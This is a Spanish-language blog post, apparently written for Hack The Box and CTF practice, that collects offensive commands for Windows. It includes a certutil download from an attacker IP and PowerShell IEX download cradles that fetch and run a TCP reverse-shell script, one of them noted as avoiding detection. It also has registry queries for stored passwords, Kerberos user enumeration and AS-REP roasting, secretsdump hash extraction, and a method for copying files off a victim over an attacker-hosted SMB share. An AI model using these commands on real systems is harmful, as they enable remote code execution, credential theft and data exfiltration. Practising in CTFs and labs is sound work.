---
layout: post
title: "Windows"
author: "TheusZero"
subtitle: 'Codigos mas usados'
header-img: "images/408a7d24f9d2e3e22990cc4629163cf2.png"
catalog: true
comments: true
---
## Windows

#### download a file

```Python
certutil.exe -f -urlcache -split http://myIpAdress/theBinary.exe thebinary.exe
```

#### powershell

```Python
start /b powershell IEX(New-Object Net.webClient).downloadString('http://miIp/Invoke-PowerShellTcp.ps1')
```

**utilizar este ya que el anterior puede dar falsos positivos**
```Python
start /b C:\Windows\SysNative\WindowsPowerShell\v1.0\powershell.exe IEX(New-Object Net.webClient).downloadString('http://miIp/Invoke-PowerShellTcp.ps1')
```

#### smb && rpc

```Python
nmap -v -script smb-vuln* -p 139,445 10.10.10.4
```

```Python
smbmap -u jsmith -p password1 -d workgroup -H 192.168.0.1
```

```Python
sudo smbclient -L //<HOST_IP_OR_NAME> -U <USERNAME%PASSWORD>

sudo smbclient -L //<HOST_IP_OR_NAME> -U <USERNAME%PASSOWRD> -g | grep Disk | cut -f 1 -d '|'
## LIST only the names of the shared Disk
```

```Python
rpcclient -U username ip
```

#### ver permisos de ejecucion y como se ejecuta (tipo SUID)

```Python
PS C:\Users\Public\Desktop> $sh = New-Object -ComObject Wscript.Shell
PS C:\Users\Public\Desktop> $target = $sh.CreateShortcut('C:\Users\Public\Desktop\theprogram')
PS C:\Users\Public\Desktop> echo $target
```

#### obtencion de passwords
```Python
reg query HKLM /f  password /t REG_SZ /s

reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul |findstr "DefaultUserName DefaultDomainName DefaultPassword"
```

#### cacls (access control list)
permisos para cada usuario, donde F es Full privilegios

```Python
cacls Administrator
```

```Python
cacls root.txt /grant TheUserMY:F
Y (yes)
```

#### winexe
ya cuando tenemos el tunnel hecho
```Python
winexe -U Administrator //127.0.0.1 "cmd.exe"
```

#### netstat
recordar el exploit zzz para el samba
```Python
netstat -nat
```

#### dns

```Python
dig axfr @ip dns
```

```Python
ldapsearch -x -h IpVictima -s base namingcontexts
```

#### kerberos

```Python
kerbrute userenum -d DNS /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc IP
```

```Python
python3 GetNPUsers.py DNS/ -usersfile users.txt -dc-ip IP -format john -outputfile hashes.txt
```

#### svc_loanmgr

con el nombre busque en google tal cual **svc_loanmgr privilage escalation** y encontre lo siguiente:

> [https://www.puckiestyle.nl/aclpwn-py/](https://www.puckiestyle.nl/aclpwn-py/)

> [https://github.com/BloodHoundAD/BloodHound](https://github.com/BloodHoundAD/BloodHound)

#### secret dump 
```Python
secretsdump.py -just-dc-ntlm DNS/USER:"PASSWORD"@IP
```

#### rottenPotato
SeImpersonatePrivilege token, which means that this machine is going to be vulnerable to the RottenPotato exploit
[RottenPotato](https://github.com/ohpe/juicy-potato/releases)

aplication:

[here!](https://codewithnoah.com/posts/htb-walkthrough-jeeves)

[hackthebox machine espanol](https://www.youtube.com/watch?v=wvWxXKKFifQ&feature=youtu.be)

#### powerSploit
[PowerSploit](https://github.com/PowerShellMafia/PowerSploit)

powersploit tiene un modulo para el privesec llamado **PowerUp.ps1**

> mismo principio de la powershell, se coloca esta linea al final del documento
```Python
Invoke-AllChecks
```

luego:

```Python
IEX(New-Object Net.WebClient).downloadString('http://myIp:8000/PowerUp.ps1')
```

#### descargar archivos desde la maquina

desde mi maquina de atacante debo crear un recurso compartido

```Python
impacket-smbserver smbFolder $(pwd)
```

desde la maquina windows que esta siendo atacada usando una poweshell y usando una utilidad de la misma realizamos la sincronizacion con mi equipo

```Python
New-PSDrive -Name "SharedFolder" -PSProvider "FileSystem" -Root "\\MYIP\smbFolder"
```

```Python
copy text.txt SharedFolder:\text.txt
```

## Herramientas

[nishang](https://github.com/samratashok/nishang)

[windows exploit suggester bacan](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)

[weseng](https://github.com/bitsadmin/wesng)

[Chimichurri](https://github.com/Re4son/Chimichurri)

## Link Interesantes

> [Windows Privilege Escalation Fundamentals](http://www.fuzzysecurity.com/tutorials/16.html)

#### USM

> [Malla-Interactiva-USM](https://mallas.labcomp.cl/?m=TEL)

> [Lab-Redes](http://www2.elo.utfsm.cl/~tel241/20102s/)

#### Other

> [ExploitDB](https://www.exploit-db.com/)

> [Campo de Marte](https://www.campodemarte.cl/)

> [CTFtime](https://ctftime.org/)

> [Escritura Exploits (Español)](https://fundacion-sadosky.github.io/guia-escritura-exploits/)